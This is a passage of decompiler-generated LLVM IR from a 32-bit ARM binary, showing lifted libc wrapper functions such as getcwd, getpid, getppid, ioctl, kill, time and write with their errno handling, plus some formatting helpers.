  %v0_cc9c = phi i32 [ %v0_cc9c.pre, %dec_label_pc_cc8c.dec_label_pc_cc9c_crit_edge ], [ %arg2, %bb17 ]
  %v1_cca0 = inttoptr i32 %v0_cca0 to i8*
  %v4_cca4 = call i8* @getcwd(i8* %v1_cca0, i32 %v0_cc9c)
  %v5_cca4 = ptrtoint i8* %v4_cca4 to i32
  %v7_cca8 = icmp eq i8* %v4_cca4, inttoptr (i32 -4096 to i8*)
  store i32 %v5_cca4, i32* @r4, align 4
  %v2_ccb0 = icmp ule i8* %v4_cca4, inttoptr (i32 -4097 to i8*)
  %v3_ccb0 = or i1 %v7_cca8, %v2_ccb0
  br i1 %v3_ccb0, label %dec_label_pc_ccc4, label %dec_label_pc_ccb4

dec_label_pc_ccb4:                                ; preds = %dec_label_pc_cc9c
  %v0_ccb4 = call i32 @function_cec4()
  %v0_ccb8 = load i32, i32* @r4, align 4
  %v1_ccb8 = sub i32 0, %v0_ccb8
  %v2_ccbc = inttoptr i32 %v0_ccb4 to i32*
  store i32 %v1_ccb8, i32* %v2_ccbc, align 4
  br label %dec_label_pc_ccf4

dec_label_pc_ccc4:                                ; preds = %dec_label_pc_cc9c
  %v1_ccc4 = icmp slt i8* %v4_cca4, null
  br i1 %v1_ccc4, label %dec_label_pc_ccf4, label %dec_label_pc_cccc

dec_label_pc_cccc:                                ; preds = %dec_label_pc_ccc4
  %v0_cccc = load i32, i32* @r5, align 4
  %v2_cccc = icmp eq i32 %v0_cccc, 0
  br i1 %v2_cccc, label %bb18, label %dec_label_pc_cce8.thread7

dec_label_pc_cce8.thread7:                        ; preds = %dec_label_pc_cccc
  br label %dec_label_pc_cd0c

bb18:                                             ; preds = %dec_label_pc_cccc
  %v1_ccd0 = load i32, i32* @r7, align 4
  %v3_ccd0 = icmp eq i32 %v1_ccd0, 0
  br i1 %v3_ccd0, label %dec_label_pc_cce8, label %dec_label_pc_cce8.thread

dec_label_pc_cce8.thread:                         ; preds = %bb18
  br label %bb19

dec_label_pc_cce8:                                ; preds = %bb18
  %v0_ccdc = load i32, i32* @r6, align 4
  %v3_cce0 = call i32 @function_febc(i32 %v0_ccdc, i32 %v5_cca4)
  store i32 %v3_cce0, i32* @r5, align 4
  %v2_cce8 = icmp eq i32 %v3_cce0, 0
  br i1 %v2_cce8, label %bb19, label %dec_label_pc_cd0c

bb19:                                             ; preds = %dec_label_pc_cce8.thread, %dec_label_pc_cce8
  %v1_ccec = load i32, i32* @r6, align 4
  store i32 %v1_ccec, i32* @r5, align 4
  br label %dec_label_pc_cd0c

dec_label_pc_ccf4:                                ; preds = %dec_label_pc_ccc4, %dec_label_pc_ccb4
  %v0_ccf4 = load i32, i32* @r5, align 4
  %v2_ccf4 = icmp eq i32 %v0_ccf4, 0
  br i1 %v2_ccf4, label %dec_label_pc_ccfc, label %dec_label_pc_cd08

dec_label_pc_ccfc:                                ; preds = %dec_label_pc_ccf4
  %v0_ccfc = load i32, i32* @r6, align 4
  store i32 %v0_ccfc, i32* @r0, align 4
  %v0_cd00 = call i32 @function_fdcc()
  br label %dec_label_pc_cd0c

dec_label_pc_cd08:                                ; preds = %dec_label_pc_ccf4, %dec_label_pc_cc8c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_cd0c

dec_label_pc_cd0c:                                ; preds = %dec_label_pc_cce8.thread7, %bb19, %dec_label_pc_cce8, %dec_label_pc_ccfc, %dec_label_pc_cc54, %dec_label_pc_cd08
  %v0_cd0c = load i32, i32* @r5, align 4
  %v2_cd10 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_cd10, i32* @r4, align 4
  store i32 %v6_cc3c, i32* @r5, align 4
  store i32 %v9_cc3c, i32* @r6, align 4
  store i32 %v12_cc3c, i32* @r7, align 4
  ret i32 %v0_cd0c

; uselistorder directives
  uselistorder i8* %v4_cca4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_cc68, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_cd0c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_cc9c, { 1, 0 }
  uselistorder label %dec_label_pc_cc8c, { 0, 2, 1 }
}

define i32 @function_cd14() local_unnamed_addr {
dec_label_pc_cd14:
  %v2_cd18 = load i32, i32* @global_var_1aab8.274, align 4
  %v2_cd1c = icmp eq i32 %v2_cd18, 0
  br i1 %v2_cd1c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_cd14
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_cd14, %bb
  %v1_cd24 = phi i32 [ %v2_cd18, %dec_label_pc_cd14 ], [ 4096, %bb ]
  ret i32 %v1_cd24

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_cd2c() local_unnamed_addr {
dec_label_pc_cd2c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cd2c = load i32, i32* @r4, align 4
  store i32 %v3_cd2c, i32* %stack_var_-8, align 4
  %v0_cd30 = call i32 @getpid()
  store i32 %v0_cd30, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_cd30, -4095
  br i1 %tmp, label %dec_label_pc_cd50, label %dec_label_pc_cd40

dec_label_pc_cd40:                                ; preds = %dec_label_pc_cd2c
  %v0_cd40 = call i32 @function_cec4()
  %v0_cd44 = load i32, i32* %r4.global-to-local, align 4
  %v1_cd44 = sub i32 0, %v0_cd44
  %v2_cd48 = inttoptr i32 %v0_cd40 to i32*
  store i32 %v1_cd44, i32* %v2_cd48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cd50

dec_label_pc_cd50:                                ; preds = %dec_label_pc_cd2c, %dec_label_pc_cd40
  %v0_cd50 = phi i32 [ %v0_cd30, %dec_label_pc_cd2c ], [ -1, %dec_label_pc_cd40 ]
  %v2_cd54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cd54, i32* @r4, align 4
  ret i32 %v0_cd50

; uselistorder directives
  uselistorder i32 %v0_cd30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cd50, { 1, 0 }
}

define i32 @function_cd58() local_unnamed_addr {
dec_label_pc_cd58:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cd58 = load i32, i32* @r4, align 4
  store i32 %v3_cd58, i32* %stack_var_-8, align 4
  %v0_cd5c = call i32 @getppid()
  store i32 %v0_cd5c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_cd5c, -4095
  br i1 %tmp, label %dec_label_pc_cd7c, label %dec_label_pc_cd6c

dec_label_pc_cd6c:                                ; preds = %dec_label_pc_cd58
  %v0_cd6c = call i32 @function_cec4()
  %v0_cd70 = load i32, i32* %r4.global-to-local, align 4
  %v1_cd70 = sub i32 0, %v0_cd70
  %v2_cd74 = inttoptr i32 %v0_cd6c to i32*
  store i32 %v1_cd70, i32* %v2_cd74, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cd7c

dec_label_pc_cd7c:                                ; preds = %dec_label_pc_cd58, %dec_label_pc_cd6c
  %v0_cd7c = phi i32 [ %v0_cd5c, %dec_label_pc_cd58 ], [ -1, %dec_label_pc_cd6c ]
  %v2_cd80 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cd80, i32* @r4, align 4
  ret i32 %v0_cd7c

; uselistorder directives
  uselistorder i32 %v0_cd5c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cd7c, { 1, 0 }
}

define i32 @function_cd84(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cd84:
  %r4.global-to-local = alloca i32, align 4
  %v2_cda0 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_cda0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_cda0, -4095
  br i1 %tmp, label %dec_label_pc_cdc0, label %dec_label_pc_cdb0

dec_label_pc_cdb0:                                ; preds = %dec_label_pc_cd84
  %v0_cdb0 = call i32 @function_cec4()
  %v0_cdb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_cdb4 = sub i32 0, %v0_cdb4
  %v2_cdb8 = inttoptr i32 %v0_cdb0 to i32*
  store i32 %v1_cdb4, i32* %v2_cdb8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cdc0

dec_label_pc_cdc0:                                ; preds = %dec_label_pc_cd84, %dec_label_pc_cdb0
  %v0_cdc0 = phi i32 [ %v2_cda0, %dec_label_pc_cd84 ], [ -1, %dec_label_pc_cdb0 ]
  ret i32 %v0_cdc0

; uselistorder directives
  uselistorder i32 %v2_cda0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cdc0, { 1, 0 }
}

define i32 @function_cdd4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cdd4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cdd4 = load i32, i32* @r4, align 4
  store i32 %v3_cdd4, i32* %stack_var_-8, align 4
  %v2_cdd8 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_cdd8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_cdd8, -4095
  br i1 %tmp, label %dec_label_pc_cdf8, label %dec_label_pc_cde8

dec_label_pc_cde8:                                ; preds = %dec_label_pc_cdd4
  %v0_cde8 = call i32 @function_cec4()
  %v0_cdec = load i32, i32* %r4.global-to-local, align 4
  %v1_cdec = sub i32 0, %v0_cdec
  %v2_cdf0 = inttoptr i32 %v0_cde8 to i32*
  store i32 %v1_cdec, i32* %v2_cdf0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cdf8

dec_label_pc_cdf8:                                ; preds = %dec_label_pc_cdd4, %dec_label_pc_cde8
  %v0_cdf8 = phi i32 [ %v2_cdd8, %dec_label_pc_cdd4 ], [ -1, %dec_label_pc_cde8 ]
  %v2_cdfc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cdfc, i32* @r4, align 4
  ret i32 %v0_cdf8

; uselistorder directives
  uselistorder i32 %v2_cdd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cdf8, { 1, 0 }
}

define i32 @function_ce00(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_ce00:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ce00 = load i32, i32* @r4, align 4
  store i32 %v3_ce00, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_ce28, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_ce00
  %v0_ce18 = call i32 @function_cec4()
  %v0_ce1c = load i32, i32* %r4.global-to-local, align 4
  %v1_ce1c = sub i32 0, %v0_ce1c
  %v2_ce20 = inttoptr i32 %v0_ce18 to i32*
  store i32 %v1_ce1c, i32* %v2_ce20, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_ce2c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ce28

dec_label_pc_ce28:                                ; preds = %dec_label_pc_ce00, %dec_label_pc_ce18
  %v2_ce2c = phi i32 [ %v3_ce00, %dec_label_pc_ce00 ], [ %v2_ce2c.pre, %dec_label_pc_ce18 ]
  %v0_ce28 = phi i32 [ %arg1, %dec_label_pc_ce00 ], [ -1, %dec_label_pc_ce18 ]
  store i32 %v2_ce2c, i32* @r4, align 4
  ret i32 %v0_ce28

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ce28, { 1, 0 }
}

define i32 @function_ce30(i32* %arg1) local_unnamed_addr {
dec_label_pc_ce30:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ce30 = load i32, i32* @r4, align 4
  store i32 %v3_ce30, i32* %stack_var_-8, align 4
  %v2_ce34 = call i32 @time(i32* %arg1)
  store i32 %v2_ce34, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_ce34, -4095
  br i1 %tmp, label %dec_label_pc_ce54, label %dec_label_pc_ce44

dec_label_pc_ce44:                                ; preds = %dec_label_pc_ce30
  %v0_ce44 = call i32 @function_cec4()
  %v0_ce48 = load i32, i32* %r4.global-to-local, align 4
  %v1_ce48 = sub i32 0, %v0_ce48
  %v2_ce4c = inttoptr i32 %v0_ce44 to i32*
  store i32 %v1_ce48, i32* %v2_ce4c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ce54

dec_label_pc_ce54:                                ; preds = %dec_label_pc_ce30, %dec_label_pc_ce44
  %v0_ce54 = phi i32 [ %v2_ce34, %dec_label_pc_ce30 ], [ -1, %dec_label_pc_ce44 ]
  %v2_ce58 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ce58, i32* @r4, align 4
  ret i32 %v0_ce54

; uselistorder directives
  uselistorder i32 %v2_ce34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ce54, { 1, 0 }
}

define i32 @function_ce5c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ce5c:
  store i32 0, i32* @r3, align 4
  %v0_ce60 = call i32 @function_114e8()
  ret i32 %v0_ce60
}

define i32 @function_ce64(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_ce64:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ce64 = load i32, i32* @r4, align 4
  store i32 %v3_ce64, i32* %stack_var_-8, align 4
  %v3_ce68 = load i32, i32* @r2, align 4
  %v4_ce68 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_ce68)
  store i32 %v4_ce68, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_ce68, -4095
  br i1 %tmp, label %dec_label_pc_ce88, label %dec_label_pc_ce78

dec_label_pc_ce78:                                ; preds = %dec_label_pc_ce64
  %v0_ce78 = call i32 @function_cec4()
  %v0_ce7c = load i32, i32* %r4.global-to-local, align 4
  %v1_ce7c = sub i32 0, %v0_ce7c
  %v2_ce80 = inttoptr i32 %v0_ce78 to i32*
  store i32 %v1_ce7c, i32* %v2_ce80, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ce88

dec_label_pc_ce88:                                ; preds = %dec_label_pc_ce64, %dec_label_pc_ce78
  %v0_ce88 = phi i32 [ %v4_ce68, %dec_label_pc_ce64 ], [ -1, %dec_label_pc_ce78 ]
  %v2_ce8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ce8c, i32* @r4, align 4
  ret i32 %v0_ce88

; uselistorder directives
  uselistorder i32 %v4_ce68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ce88, { 1, 0 }
}

define i32 @function_ce90(i32 %arg1) local_unnamed_addr {
dec_label_pc_ce90:
  %v1_ce98 = icmp slt i32 %arg1, 0
  br i1 %v1_ce98, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_ce90
  ret i32 %arg1

bb1:                                              ; preds = %dec_label_pc_ce90
  %v2_ce98 = mul i32 %arg1, 2
  %v2_cea4 = load i32, i32* @global_var_180f4, align 4
  %v2_cea8 = add i32 %v2_cea4, %v2_ce98
  %v3_ceac = inttoptr i32 %v2_cea8 to i8*
  %v4_ceac = load i8, i8* %v3_ceac, align 1
  %v6_ceac = zext i8 %v4_ceac to i32
  %v1_ceb0 = add i32 %v2_cea8, 1
  %v2_ceb0 = inttoptr i32 %v1_ceb0 to i8*
  %v3_ceb0 = load i8, i8* %v2_ceb0, align 1
  %v4_ceb0 = zext i8 %v3_ceb0 to i32
  %v3_ceb4 = mul nuw i32 %v4_ceb0, 16777216
  %v4_ceb8 = sdiv i32 %v3_ceb4, 65536
  %v5_ceb8 = or i32 %v4_ceb8, %v6_ceac
  ret i32 %v5_ceb8

; uselistorder directives
  uselistorder i32 %v2_cea8, { 1, 0 }
}

define i32 @function_cec4() local_unnamed_addr {
dec_label_pc_cec4:
  ret i32 ptrtoint (i32* @global_var_1aac8.281 to i32)
}

define i32 @function_ced0(i8* %arg1) local_unnamed_addr {
dec_label_pc_ced0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ced0 = load i32, i32* @r4, align 4
  store i32 %v3_ced0, i32* %stack_var_-32, align 4
  %v6_ced0 = load i32, i32* @r5, align 4
  %v9_ced0 = load i32, i32* @r6, align 4
  %v12_ced0 = load i32, i32* @r7, align 4
  %v15_ced0 = load i32, i32* @r8, align 4
  %v2_ced4 = add i32 %tmp, 52
  %v3_ced4 = inttoptr i32 %v2_ced4 to i32*
  %v4_ced4 = load i32, i32* %v3_ced4, align 4
  store i32 %v4_ced4, i32* @r8, align 4
  %v2_ced8 = add i32 %tmp, 56
  store i32 %v2_ced8, i32* @r5, align 4
  %v2_cedc = ptrtoint i32* %stack_var_-64 to i32
  %v2_cee0 = icmp eq i32 %v4_ced4, 0
  store i1 %v2_cee0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_cef0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_cef0, i32* @r0, align 4
  br i1 %v2_cee0, label %dec_label_pc_cef8, label %dec_label_pc_cf14

dec_label_pc_cef8:                                ; preds = %dec_label_pc_ced0
  store i32 68948, i32* %r3.global-to-local, align 4
  %v1_cf00 = call i32 @function_10d54()
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  %v1_cf10 = call i32 @function_10d4c()
  %v0_cf14.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cf14

dec_label_pc_cf14:                                ; preds = %dec_label_pc_ced0, %dec_label_pc_cef8
  %v0_cf1c = phi i32 [ %tmp, %dec_label_pc_ced0 ], [ %v0_cf14.pre, %dec_label_pc_cef8 ]
  %v1_cf14 = inttoptr i32 %v0_cf1c to i8*
  %v2_cf14 = load i8, i8* %v1_cf14, align 1
  %v3_cf14 = zext i8 %v2_cf14 to i32
  %v1_cf18 = and i32 %v3_cf14, 64
  store i32 %v1_cf18, i32* %r3.global-to-local, align 4
  %v2_cf18 = icmp eq i32 %v1_cf18, 0
  store i1 %v2_cf18, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cf18, i32* @r7, align 4
  br i1 %v2_cf18, label %dec_label_pc_cf30, label %dec_label_pc_cf28

dec_label_pc_cf28:                                ; preds = %dec_label_pc_cf14
  %v3_cf28 = call i32 @function_eae8(i8* %v1_cf14)
  store i32 %v3_cf28, i32* @r7, align 4
  %v0_cf30.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cf30

dec_label_pc_cf30:                                ; preds = %dec_label_pc_cf14, %dec_label_pc_cf28
  %v0_cf30 = phi i32 [ %v0_cf1c, %dec_label_pc_cf14 ], [ %v0_cf30.pre, %dec_label_pc_cf28 ]
  %v1_cf30 = add i32 %v0_cf30, 4
  %v2_cf30 = inttoptr i32 %v1_cf30 to i32*
  %v3_cf30 = load i32, i32* %v2_cf30, align 4
  %v1_cf34 = call i32 @function_cbe4(i32 %v3_cf30)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_cf3c = icmp slt i32 %v1_cf34, 0
  %v2_cf3c = icmp eq i32 %v1_cf34, 0
  store i1 %v2_cf3c, i1* %cpsr_z.global-to-local, align 1
  %v1_cf40 = load i32, i32* @r4, align 4
  %v2_cf40 = add i32 %v1_cf40, 4
  %v3_cf40 = inttoptr i32 %v2_cf40 to i32*
  store i32 -1, i32* %v3_cf40, align 4
  store i32 %v2_cedc, i32* @r0, align 4
  br i1 %v1_cf3c, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_cf30
  %v3_cf54 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_cf54, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_cf30, %bb
  %v1_cf60 = call i32 @function_10d54()
  %v1_cf6c = call i32 @function_10d4c()
  %v2_cf74 = load i32, i32* @global_var_188a4.289, align 4
  %v1_cf78 = add i32 %v2_cf74, 1
  store i32 %v1_cf78, i32* %r3.global-to-local, align 4
  store i32 %v1_cf78, i32* @global_var_188a4.289, align 4
  store i32 %v2_cedc, i32* @r0, align 4
  %v1_cf90 = call i32 @function_10d54()
  %v0_cf94 = load i32, i32* @r4, align 4
  %v1_cf94 = inttoptr i32 %v0_cf94 to i32*
  %v2_cf94 = load i32, i32* %v1_cf94, align 4
  %v1_cf98 = and i32 %v2_cf94, 24576
  store i32 %v1_cf98, i32* %r3.global-to-local, align 4
  %v3_cf9c1 = udiv i32 %v1_cf98, 256
  %v1_cfa0 = trunc i32 %v3_cf9c1 to i8
  %v3_cfa0 = add i32 %v0_cf94, 1
  %v4_cfa0 = inttoptr i32 %v3_cfa0 to i8*
  store i8 %v1_cfa0, i8* %v4_cfa0, align 1
  %v0_cfa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_cfa4 = trunc i32 %v0_cfa4 to i8
  %v2_cfa4 = load i32, i32* @r4, align 4
  %v3_cfa4 = inttoptr i32 %v2_cfa4 to i8*
  store i8 %v1_cfa4, i8* %v3_cfa4, align 1
  %v0_cfa8 = load i32, i32* @r4, align 4
  %v1_cfa8 = inttoptr i32 %v0_cfa8 to i32*
  %v2_cfa8 = load i32, i32* %v1_cfa8, align 4
  %v1_cfac = or i32 %v2_cfa8, 48
  store i32 %v1_cfac, i32* %r3.global-to-local, align 4
  %v3_cfb0 = sdiv i32 %v2_cfa8, 256
  %v0_cfb4 = load i32, i32* @r8, align 4
  %v2_cfb4 = icmp eq i32 %v0_cfb4, 0
  store i1 %v2_cfb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_cef0, i32* @r0, align 4
  %v1_cfc4 = trunc i32 %v3_cfb0 to i8
  %v3_cfc4 = add i32 %v0_cfa8, 1
  %v4_cfc4 = inttoptr i32 %v3_cfc4 to i8*
  store i8 %v1_cfc4, i8* %v4_cfc4, align 1
  %v0_cfc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cfc8 = trunc i32 %v0_cfc8 to i8
  %v2_cfc8 = load i32, i32* @r4, align 4
  %v3_cfc8 = inttoptr i32 %v2_cfc8 to i8*
  store i8 %v1_cfc8, i8* %v3_cfc8, align 1
  %v0_cfcc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cfcc, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_cfd0 = call i32 @function_10d54()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_cfd4 = load i32, i32* @r4, align 4
  %v1_cfd4 = add i32 %v0_cfd4, 1
  %v2_cfd4 = inttoptr i32 %v1_cfd4 to i8*
  %v3_cfd4 = load i8, i8* %v2_cfd4, align 1
  %v4_cfd4 = zext i8 %v3_cfd4 to i32
  store i32 %v4_cfd4, i32* %r3.global-to-local, align 4
  %v1_cfd8 = and i32 %v4_cfd4, 64
  %v2_cfd8 = icmp eq i32 %v1_cfd8, 0
  store i1 %v2_cfd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cfd8, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_cfe0 = xor i1 %v2_cfd8, true
  call void @__pseudo_cond_branch(i1 %v1_cfe0, i32 ptrtoint (i32* @global_var_fdcc.291 to i32))
  store i32 %v2_cedc, i32* @r0, align 4
  %v1_cff4 = call i32 @function_10d54()
  %v1_d000 = call i32 @function_10d4c()
  %v2_d008 = load i32, i32* @global_var_188a8.294, align 4
  %v1_d00c = add i32 %v2_d008, 1
  store i32 %v1_d00c, i32* %r3.global-to-local, align 4
  store i32 %v2_cedc, i32* @r0, align 4
  store i32 %v1_d00c, i32* @global_var_188a8.294, align 4
  %v1_d020 = call i32 @function_10d54()
  %v1_d024 = call i32 @function_e9a8(i32 %v1_d020)
  %v0_d028 = load i32, i32* @r7, align 4
  %v2_d030 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_d030, i32* @r4, align 4
  store i32 %v6_ced0, i32* @r5, align 4
  store i32 %v9_ced0, i32* @r6, align 4
  store i32 %v12_ced0, i32* @r7, align 4
  store i32 %v15_ced0, i32* @r8, align 4
  ret i32 %v0_d028

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_cf30, { 1, 0 }
  uselistorder label %dec_label_pc_cf14, { 1, 0 }
}

define i32 @function_d050(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d050:
  %v0_d058 = load i32, i32* @r0, align 4
  %v1_d058 = load i32, i32* @r1, align 4
  %v4_d058 = inttoptr i32 %v1_d058 to i8*
  %v5_d058 = call i32 @function_d498(i32 %v0_d058, i8* %v4_d058, i32 0, i32 -1)
  ret i32 %v5_d058
}

define i32 @function_d05c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d05c:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 -1, i32* @r1, align 4
  %v0_d068 = call i32 @function_d0a0()
  ret i32 %v0_d068
}

define i32 @function_d06c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d06c:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_d078 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_d078, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_d08c = call i32 @function_d0a0()
  ret i32 %v0_d08c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_d0a0() local_unnamed_addr {
dec_label_pc_d0a0:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_d0a0 = load i32, i32* @r4, align 4
  %v6_d0a0 = load i32, i32* @r5, align 4
  %v12_d0a0 = load i32, i32* @r7, align 4
  %v15_d0a0 = load i32, i32* @r8, align 4
  %v18_d0a0 = load i32, i32* @sl, align 4
  %v0_d0a4 = load i32, i32* @r3, align 4
  store i32 %v0_d0a4, i32* @r8, align 4
  %v2_d0a8 = ptrtoint i32* %stack_var_-108 to i32
  %v0_d0b0 = load i32, i32* @r0, align 4
  %v1_d0b0 = sub i32 -1, %v0_d0b0
  store i32 %v1_d0b0, i32* @r5, align 4
  store i32 %v0_d0b0, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_d0c4 = load i32, i32* @r1, align 4
  %v3_d0c4 = icmp ult i32 %v1_d0b0, %v1_d0c4
  br i1 %v3_d0c4, label %bb23, label %bb

bb:                                               ; preds = %dec_label_pc_d0a0
  store i32 %v1_d0c4, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_d0a0, %bb
  %v0_d0cc = load i32, i32* @r2, align 4
  store i32 %v0_d0cc, i32* @r7, align 4
  %v2_d0d0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_d0d0, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_d0ec = call i32 @function_d800()
  %v0_d0f0 = load i32, i32* @r4, align 4
  %v1_d0f0 = load i32, i32* @r5, align 4
  %v2_d0f0 = add i32 %v1_d0f0, %v0_d0f0
  %v0_d0f8 = load i32, i32* @r7, align 4
  %v0_d0fc = load i32, i32* @r8, align 4
  %v0_d108 = load i32, i32* @sl, align 4
  %v12_d11c = inttoptr i32 %v0_d0f8 to i8*
  %v13_d11c = call i32 @function_d9c8(i32 %v2_d0a8, i8* %v12_d11c, i32 %v0_d0fc, i32 %v2_d0f0, i32 %v0_d0f0, i32 %v2_d0f0, i32 %v0_d0f0, i32 %v0_d0f0, i32 %v0_d0f0, i32 %v2_d0f0, i32 %v0_d108)
  %v0_d120 = load i32, i32* @r5, align 4
  %v1_d120 = load i32, i32* @sl, align 4
  %v9_d120 = icmp eq i32 %v0_d120, %v1_d120
  br i1 %v9_d120, label %dec_label_pc_d148, label %dec_label_pc_d12c

dec_label_pc_d12c:                                ; preds = %bb23
  %v9_d134 = icmp eq i32 %v1_d0f0, 0
  %v1_d138 = sext i1 %v9_d134 to i32
  %v1_d138.v0_d100 = add i32 %v0_d0f0, %v1_d138
  %stack_var_-92.0 = inttoptr i32 %v1_d138.v0_d100 to i8*
  %v1_d144 = trunc i32 %v1_d120 to i8
  store i8 %v1_d144, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_d148

dec_label_pc_d148:                                ; preds = %bb23, %dec_label_pc_d12c
  store i32 %v3_d0a0, i32* @r4, align 4
  store i32 %v6_d0a0, i32* @r5, align 4
  store i32 %v12_d0a0, i32* @r7, align 4
  store i32 %v15_d0a0, i32* @r8, align 4
  store i32 %v18_d0a0, i32* @sl, align 4
  ret i32 %v13_d11c

; uselistorder directives
  uselistorder i32 %v1_d0f0, { 1, 0 }
  uselistorder i32 %v0_d0f0, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_d0c4, { 1, 0 }
